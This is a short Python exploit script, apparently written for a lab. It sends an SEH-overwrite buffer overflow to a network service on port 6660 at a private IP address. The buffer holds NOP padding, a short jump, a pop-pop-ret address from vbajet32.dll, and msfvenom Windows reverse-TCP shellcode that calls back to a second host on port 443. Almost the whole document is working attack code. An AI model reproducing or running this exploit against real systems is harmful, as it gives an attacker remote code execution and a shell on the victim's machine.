#!/usr/bin/python
import socket

target_address="192.168.100.118"
target_port=6660

buf = "USV "
buf+= "\x90" * 962
buf+= "\xeb\x06\x90\x90" # JMP SHORT 6, NOP Padding
buf+= "\x9f\xa1\x11\x1b" # SEH Overwrite - pop-pop-ret from vbajet32.dll 0x1b11a19f

buf+= "\x90" * 16 # NOP padding before shellcode

# sudo msfvenom -p windows/shell_reverse_tcp lhost=192.168.100.108 lport=443 EXITFUNC=thread -b "\x00\x0a\0x0d" -f python
# Payload size: 348 bytes
buf += b""
buf += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\xd1\xfc\xa5\xd8\x83\xee\xfc\xe2\xf4\x2d\x14"
buf += b"\x27\xd8\xd1\xfc\xc5\x51\x34\xcd\x65\xbc\x5a\xac\x95"
buf += b"\x53\x83\xf0\x2e\x8a\xc5\x77\xd7\xf0\xde\x4b\xef\xfe"
buf += b"\xe0\x03\x09\xe4\xb0\x80\xa7\xf4\xf1\x3d\x6a\xd5\xd0"
buf += b"\x3b\x47\x2a\x83\xab\x2e\x8a\xc1\x77\xef\xe4\x5a\xb0"
buf += b"\xb4\xa0\x32\xb4\xa4\x09\x80\x77\xfc\xf8\xd0\x2f\x2e"
buf += b"\x91\xc9\x1f\x9f\x91\x5a\xc8\x2e\xd9\x07\xcd\x5a\x74"
buf += b"\x10\x33\xa8\xd9\x16\xc4\x45\xad\x27\xff\xd8\x20\xea"
buf += b"\x81\x81\xad\x35\xa4\x2e\x80\xf5\xfd\x76\xbe\x5a\xf0"
buf += b"\xee\x53\x89\xe0\xa4\x0b\x5a\xf8\x2e\xd9\x01\x75\xe1"
buf += b"\xfc\xf5\xa7\xfe\xb9\x88\xa6\xf4\x27\x31\xa3\xfa\x82"
buf += b"\x5a\xee\x4e\x55\x8c\x94\x96\xea\xd1\xfc\xcd\xaf\xa2"
buf += b"\xce\xfa\x8c\xb9\xb0\xd2\xfe\xd6\x03\x70\x60\x41\xfd"
buf += b"\xa5\xd8\xf8\x38\xf1\x88\xb9\xd5\x25\xb3\xd1\x03\x70"
buf += b"\x88\x81\xac\xf5\x98\x81\xbc\xf5\xb0\x3b\xf3\x7a\x38"
buf += b"\x2e\x29\x32\xb2\xd4\x94\x65\x70\xb5\x90\xcd\xda\xd1"
buf += b"\xfd\x1e\x51\x37\x96\xb5\x8e\x86\x94\x3c\x7d\xa5\x9d"
buf += b"\x5a\x0d\x54\x3c\xd1\xd4\x2e\xb2\xad\xad\x3d\x94\x55"
buf += b"\x6d\x73\xaa\x5a\x0d\xb9\x9f\xc8\xbc\xd1\x75\x46\x8f"
buf += b"\x86\xab\x94\x2e\xbb\xee\xfc\x8e\x33\x01\xc3\x1f\x95"
buf += b"\xd8\x99\xd9\xd0\x71\xe1\xfc\xc1\x3a\xa5\x9c\x85\xac"
buf += b"\xf3\x8e\x87\xba\xf3\x96\x87\xaa\xf6\x8e\xb9\x85\x69"
buf += b"\xe7\x57\x03\x70\x51\x31\xb2\xf3\x9e\x2e\xcc\xcd\xd0"
buf += b"\x56\xe1\xc5\x27\x04\x47\x45\xc5\xfb\xf6\xcd\x7e\x44"
buf += b"\x41\x38\x27\x04\xc0\xa3\xa4\xdb\x7c\x5e\x38\xa4\xf9"
buf += b"\x1e\x9f\xc2\x8e\xca\xb2\xd1\xaf\x5a\x0d"

buf+= "\x90" * (2504 - len(buf))
buf+= "\r\n\r\n"

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buf)
sock.close()

